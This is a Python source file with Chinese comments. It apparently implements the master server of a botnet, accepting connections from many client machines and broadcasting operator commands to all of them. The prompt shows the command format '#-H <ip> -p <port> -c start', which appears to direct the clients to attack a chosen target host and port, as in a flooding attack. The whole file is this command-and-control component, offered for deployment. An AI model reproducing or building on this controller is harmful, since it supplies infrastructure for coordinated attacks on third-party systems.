import socket
import argparse
import threading

socketList = []

#**********************
#                     *
#本文件请部署在服务器上 *
#                     *
#**********************

#  发送命令到所有的客户机上
def sendCmd(cmd:str):
    print('Send command....')
    for sock in socketList:
        sock.send(cmd.encode())

#  等待连接，将建立好的连接加入到socketList列表中
def waitConnect(s):
        while True:
            sock, addr = s.accept() #收集连接的客户端的套接字和ip地址
            if sock not in socketList:
                socketList.append(sock) #若连接的客户端的套接字未在历史列表中出现，则在历史列表中添加新的客户端

def main():
    #  创建tcp服务端套接字
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  #设置端口复用，以让一个端口可以容许多个客户端连接
    s.bind(('0.0.0.0',58868))  #此处的0.0.0.0替换为服务器的ip地址或者本地ip地址(127.0.0.1)，58868替换成需要连接的端口(0~65535)
    s.listen(1024) #监听该套接字绑定的端口号，此处的1024是最大客户机连接数

    #  线程创建等待连接请求
    #  等待连接必须一直进行，故需要单独开一个线程
    t = threading.Thread(target=waitConnect, args=(s,))
    t.start()

    print("Wait at least a client connection!")
    while not len(socketList):  # 没有连接则一直等待
        pass
    print("It has been a client connection") #至少有一个客户端连接到了服务器端

    while True:
        print('='*50)
        #  命令格式
        print('The command format:"#-H xxx.xxx.xxx.xxx -p xxxx -c start"')
        #  等待输入命令
        cmd_str = input('please input cmd:')
        if len(cmd_str):
            if cmd_str[0] == '#':
                sendCmd(cmd_str)#若命令合法，则发送命令

if __name__ == '__main__':
    main()